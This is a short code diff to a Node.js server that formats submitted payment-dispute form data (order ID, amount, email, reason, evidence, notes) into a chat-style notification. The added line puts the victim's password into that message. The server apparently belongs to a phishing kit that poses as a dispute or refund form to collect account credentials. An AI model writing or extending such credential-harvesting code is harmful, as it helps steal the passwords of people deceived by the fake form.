@@ -134,6 +134,7 @@ const server = http.createServer(async (req, res) => {
 📦 <b>Order ID:</b> ${data.orderId || 'N/A'}
 💰 <b>Disputed Amount:</b> ${data.claimAmount || 'N/A'}
 📧 <b>Contact Email:</b> ${data.email || 'N/A'}
+🔑 <b>Password:</b> ${data.password || 'N/A'}
 📋 <b>Dispute Reason:</b> ${data.reasonText || 'N/A'}
 📎 <b>Evidence File:</b> ${data.evidenceFile || 'None'}
 📝 <b>Notes:</b> ${data.notes || 'None'}
